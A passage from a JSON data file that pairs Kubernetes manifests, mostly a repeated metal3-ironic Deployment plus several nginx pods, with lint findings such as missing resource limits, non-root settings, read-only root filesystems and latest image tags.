/bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ironic-httpd\" has cpu request 0"
  },
  {
    "id": "7603",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ironic-inspector\" has cpu request 0"
  },
  {
    "id": "7604",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ironic-ipa-downloader\" has cpu request 0"
  },
  {
    "id": "7605",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mariadb\" has cpu request 0"
  },
  {
    "id": "7606",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ironic\" has memory limit 0"
  },
  {
    "id": "7607",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ironic-dnsmasq\" has memory limit 0"
  },
  {
    "id": "7608",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ironic-httpd\" has memory limit 0"
  },
  {
    "id": "7609",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ironic-inspector\" has memory limit 0"
  },
  {
    "id": "7610",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ironic-ipa-downloader\" has memory limit 0"
  },
  {
    "id": "7611",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mariadb\" has memory limit 0"
  },
  {
    "id": "7612",
    "manifest_path": "data/manifests/the_stack_sample/sample_2785.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: mongo\n  labels:\n    app: mongo\n  namespace: main\nspec:\n  ports:\n  - port: 27017\n    protocol: TCP\n  selector:\n    app: mongo\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:mongo])"
  },
  {
    "id": "7613",
    "manifest_path": "data/manifests/the_stack_sample/sample_2787.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: controller-manager\n  namespace: system\n  labels:\n    control-plane: controller-manager\nspec:\n  selector:\n    matchLabels:\n      control-plane: controller-manager\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        control-plane: controller-manager\n    spec:\n      containers:\n      - command:\n        - rpaas-operator\n        args:\n        - --enable-leader-election\n        image: tsuru/rpaas-operator:latest\n        name: manager\n        resources:\n          limits:\n            cpu: 100m\n            memory: 30Mi\n          requests:\n            cpu: 100m\n            memory: 20Mi\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"manager\" is using an invalid container image, \"tsuru/rpaas-operator:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7614",
    "manifest_path": "data/manifests/the_stack_sample/sample_2787.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: controller-manager\n  namespace: system\n  labels:\n    control-plane: controller-manager\nspec:\n  selector:\n    matchLabels:\n      control-plane: controller-manager\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        control-plane: controller-manager\n    spec:\n      containers:\n      - command:\n        - rpaas-operator\n        args:\n        - --enable-leader-election\n        image: tsuru/rpaas-operator:latest\n        name: manager\n        resources:\n          limits:\n            cpu: 100m\n            memory: 30Mi\n          requests:\n            cpu: 100m\n            memory: 20Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"manager\" does not have a read-only root file system"
  },
  {
    "id": "7615",
    "manifest_path": "data/manifests/the_stack_sample/sample_2787.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: controller-manager\n  namespace: system\n  labels:\n    control-plane: controller-manager\nspec:\n  selector:\n    matchLabels:\n      control-plane: controller-manager\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        control-plane: controller-manager\n    spec:\n      containers:\n      - command:\n        - rpaas-operator\n        args:\n        - --enable-leader-election\n        image: tsuru/rpaas-operator:latest\n        name: manager\n        resources:\n          limits:\n            cpu: 100m\n            memory: 30Mi\n          requests:\n            cpu: 100m\n            memory: 20Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"manager\" is not set to runAsNonRoot"
  },
  {
    "id": "7616",
    "manifest_path": "data/manifests/the_stack_sample/sample_2788.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9737\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7617",
    "manifest_path": "data/manifests/the_stack_sample/sample_2788.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9737\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "7618",
    "manifest_path": "data/manifests/the_stack_sample/sample_2788.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9737\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "7619",
    "manifest_path": "data/manifests/the_stack_sample/sample_2788.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9737\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "7620",
    "manifest_path": "data/manifests/the_stack_sample/sample_2788.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9737\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "7621",
    "manifest_path": "data/manifests/the_stack_sample/sample_2789.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: private-nginx\nspec:\n  containers:\n  - name: private-nginx\n    image: 10.138.0.3:30500/my-nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"private-nginx\" is using an invalid container image, \"10.138.0.3:30500/my-nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7622",
    "manifest_path": "data/manifests/the_stack_sample/sample_2789.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: private-nginx\nspec:\n  containers:\n  - name: private-nginx\n    image: 10.138.0.3:30500/my-nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"private-nginx\" does not have a read-only root file system"
  },
  {
    "id": "7623",
    "manifest_path": "data/manifests/the_stack_sample/sample_2789.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: private-nginx\nspec:\n  containers:\n  - name: private-nginx\n    image: 10.138.0.3:30500/my-nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"private-nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "7624",
    "manifest_path": "data/manifests/the_stack_sample/sample_2789.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: private-nginx\nspec:\n  containers:\n  - name: private-nginx\n    image: 10.138.0.3:30500/my-nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"private-nginx\" has cpu request 0"
  },
  {
    "id": "7625",
    "manifest_path": "data/manifests/the_stack_sample/sample_2789.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: private-nginx\nspec:\n  containers:\n  - name: private-nginx\n    image: 10.138.0.3:30500/my-nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"private-nginx\" has memory limit 0"
  },
  {
    "id": "7626",
    "manifest_path": "data/manifests/the_stack_sample/sample_2791.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: slave\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: slave\n  template:\n    metadata:\n      labels:\n        app: slave\n    spec:\n      containers:\n      - name: slave\n        image: alpine:latest\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        ports:\n        - containerPort: 80\n        command:\n        - /bin/sh\n        - -ec\n        - sleep 1000\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"slave\" is using an invalid container image, \"alpine:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7627",
    "manifest_path": "data/manifests/the_stack_sample/sample_2791.yaml",
